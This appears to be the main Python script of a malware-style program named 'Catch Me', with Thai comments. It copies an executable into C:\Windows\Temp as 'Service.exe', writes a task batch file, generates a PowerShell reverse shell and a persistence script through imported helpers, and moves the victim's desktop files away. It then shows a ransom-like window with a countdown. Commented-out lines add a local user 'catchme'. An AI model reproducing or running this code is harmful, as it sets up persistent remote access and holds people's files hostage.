from display import CountdownTimer
import tkinter as tk
from movefile import move_files_to_folder
from adduser import create_user
from createfile_bat import *
from runfile import *
from create_filePS1_reverse_shell import create_reverseshell_PS1
from username import get_username
from check_file import *
from copy_file import *
if __name__ == "__main__":
    # สร้าง Tkinter window
        username = get_username()
        files_to_check = ["Service.exe"]#["Task.bat", "shell.ps1","persistence.bat"]
        result = check_to_path(files_to_check)
        if result:
            print("Yesss!!")
            

        else:
            #print("Nooooo!!")
            files_to_check = ["Antivirus.exe"]
            result = check_to_path(files_to_check)
            path_file_catchme = os.path.normpath(result[0].strip())
            if result:
                task_bat_path = "C:\\Windows\\Temp\\task.bat"
                print(path_file_catchme)
                path_to_copy = "C:\\windows\\Temp\\Service.exe"
                copy_file(path_file_catchme,path_to_copy)
                script_path = path_to_copy
                print(script_path)
                create_task_bat(task_bat_path, script_path)
                

                reverseshell_path = f"C:\\Windows\\Temp\\shell.ps1"     
                create_reverseshell_PS1(reverseshell_path)

                create_persistence_bat()

                moved_files = move_files_to_folder()
                
                namepath = "C:\\Windows\\Temp\\"
                namefile = "task"
                file_types = "bat"
                run_bat_file(namepath,namefile,file_types)

                
        root = tk.Tk()
        root.title('Catch Me')
        root.configure(bg="black")

        # กำหนดเวลานับถอยหลัง (วินาที)
        countdown_seconds = 3600  # ตั้งค่าเป็น 5 นาที

        label_text = "\n I have moved files on your desktop to another location.\nIf you want the files back, Catch me if you can."
        label = tk.Label(root, text=label_text, font=("Arial", 16), foreground="green", background="black")
        label.pack()

        # สร้าง CountdownTimer instance
        countdown_timer = CountdownTimer(root, countdown_seconds)

        # แสดง Tkinter window
        root.mainloop()   
            
        #####################################################################
        ############## สร้างไฟล์ task.bat + run.bat เพื่อให้รัน display ทุกๆนาที #######     
        """ username = get_username()
        task_bat_path = f"C://Users//{username}//Desktop//task.bat"
        script_path = f"C://Users//{username}//Desktop//catch_me//display.py"
        create_task_bat(task_bat_path, script_path)
        namefile = "task"
        file_types = "bat"
        run_bat_file(namefile,file_types) """
        #######################################################################
        ################# สร้าง reverseshell.ps1  ########################
        """ username = get_username()
        reverseshell_path = f"C://Users//{username}//Desktop//shell.ps1"     
        create_reverseshell_PS1(reverseshell_path) """
        ########################################################################
        ###########################
        """ create_persistence_bat() """
        ###########################
        #create user catchme
        #create_user("catchme", "1234")
        #movefile C:/Windows/Temp/move
        """ moved_files = move_files_to_folder(file_extension='.txt', destination_folder='move')
        print(f"ไฟล์ทั้งหมดบน desktop ถูกย้ายไปยังโฟลเดอร์ 'move' แล้ว:")
        for file in moved_files:
            print(file) """


